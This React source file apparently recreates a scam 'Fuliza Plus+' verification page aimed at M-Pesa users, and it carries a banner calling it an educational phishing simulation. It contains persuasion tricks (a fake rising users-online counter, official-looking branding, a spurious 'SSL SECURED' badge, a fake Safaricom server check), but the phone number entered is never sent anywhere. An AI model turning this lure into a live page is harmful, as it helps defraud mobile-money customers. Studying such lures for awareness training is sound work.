'use client';
// src/app/page.tsx - Exact Visual Match to ish-fuliza-boost.vercel.app (Educational Demo)

import React, { useState, useEffect } from 'react';

export default function FulizaBoostExactClone() {
  const [usersOnline, setUsersOnline] = useState(137);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [isChecking, setIsChecking] = useState(false);
  const [step, setStep] = useState<'input' | 'loading' | 'result' | 'select'>('input');

  // Live users online counter (like the real site)
  useEffect(() => {
    const interval = setInterval(() => {
      setUsersOnline(prev => prev + Math.floor(Math.random() * 3) + 1);
    }, 3200);
    return () => clearInterval(interval);
  }, []);

  const handleCheckEligibility = () => {
    if (!phoneNumber.trim()) {
      alert("Please enter your M-Pesa number (demo only)");
      return;
    }
    setIsChecking(true);
    setStep('loading');

    setTimeout(() => {
      setIsChecking(false);
      setStep('result');   // Shows "High Trust Score" + Proceed button
    }, 2200);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-emerald-50 via-white to-emerald-50 flex items-center justify-center px-4 py-8 font-sans">
      {/* RED WARNING BANNER - REQUIRED FOR YOUR SAFARICOM JOB PRESENTATION */}
      <div className="fixed top-0 left-0 right-0 bg-red-600 text-white text-center py-2 text-xs font-bold z-50">
        🚨 EDUCATIONAL PHISHING SIMULATION ONLY — FOR SAFARICOM CYBERSECURITY JOB APPLICATION<br />
        DO NOT ENTER REAL M-PESA NUMBER OR DATA
      </div>

      <div className="w-full max-w-[380px]">
        {/* Main White Card */}
        <div className="bg-white rounded-3xl shadow-xl overflow-hidden">
          {/* Top Icon */}
          <div className="flex justify-center pt-10 pb-6">
            <div className="relative">
              <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center">
                <div className="w-12 h-12 bg-emerald-600 rounded-full flex items-center justify-center text-white text-3xl">
                  👤
                </div>
              </div>
              <div className="absolute -bottom-1 -right-1 w-8 h-8 bg-white rounded-full flex items-center justify-center shadow">
                🛡️
              </div>
            </div>
          </div>

          {/* Title Section */}
          <div className="text-center px-8">
            <h1 className="text-4xl font-bold tracking-tight text-gray-900">Fuliza Plus+</h1>
            <p className="text-emerald-600 font-semibold mt-1 text-lg">OFFICIAL VERIFICATION PORTAL</p>
            <p className="text-gray-600 mt-6 text-[15px] leading-relaxed">
              Verify your identity to unlock higher daily transaction limits.
            </p>
          </div>

          {/* Input Field */}
          {step === 'input' && (
            <div className="px-8 mt-10">
              <div className="relative">
                <div className="absolute left-5 top-4 text-emerald-600">
                  📱
                </div>
                <input
                  type="tel"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  placeholder="Enter M-Pesa Number"
                  className="w-full bg-gray-50 border border-gray-200 rounded-2xl pl-14 pr-6 py-4 text-base outline-none focus:border-emerald-500 transition"
                />
              </div>

              <button
                onClick={handleCheckEligibility}
                disabled={isChecking}
                className="mt-6 w-full bg-emerald-600 hover:bg-emerald-700 disabled:bg-emerald-400 transition py-4 rounded-2xl text-white font-semibold text-lg flex items-center justify-center gap-2"
              >
                Check My Eligibility 
                <span>›</span>
              </button>
            </div>
          )}

          {/* Bottom Bar */}
          <div className="mt-12 border-t border-gray-100 py-4 px-8 flex items-center justify-between text-xs text-gray-500">
            <div className="flex items-center gap-1.5">
              <span className="text-emerald-500">●</span>
              <span>{usersOnline} USERS ONLINE</span>
            </div>
            <div className="flex items-center gap-1">
              🔒 SSL SECURED
            </div>
          </div>
        </div>

        {/* Loading Screen */}
        {step === 'loading' && (
          <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
            <div className="bg-white rounded-3xl p-10 w-[320px] text-center">
              <div className="animate-spin h-12 w-12 border-4 border-emerald-600 border-t-transparent rounded-full mx-auto"></div>
              <p className="mt-6 text-gray-700 font-medium">Connecting to Safaricom servers...</p>
              <p className="text-xs text-gray-500 mt-8">Please wait • Do not close</p>
            </div>
          </div>
        )}

        {/* Result Screen (High Trust Score + Proceed) */}
        {step === 'result' && (
          <div className="mt-8 bg-white rounded-3xl shadow-xl p-8 text-center">
            <div className="text-5xl mb-4">🎉</div>
            <h2 className="text-2xl font-bold text-emerald-700">Congratulations!</h2>
            <p className="text-xl mt-2">High Trust Score Detected</p>
            <p className="text-gray-600 mt-6">Your account is eligible for a Fuliza boost.</p>

            <button 
              onClick={() => setStep('select')}
              className="mt-10 w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold text-lg"
            >
              Proceed to Upgrade Limit
            </button>
          </div>
        )}

        {/* You can expand 'select' step with limit grid if needed */}
      </div>
    </div>
  );
}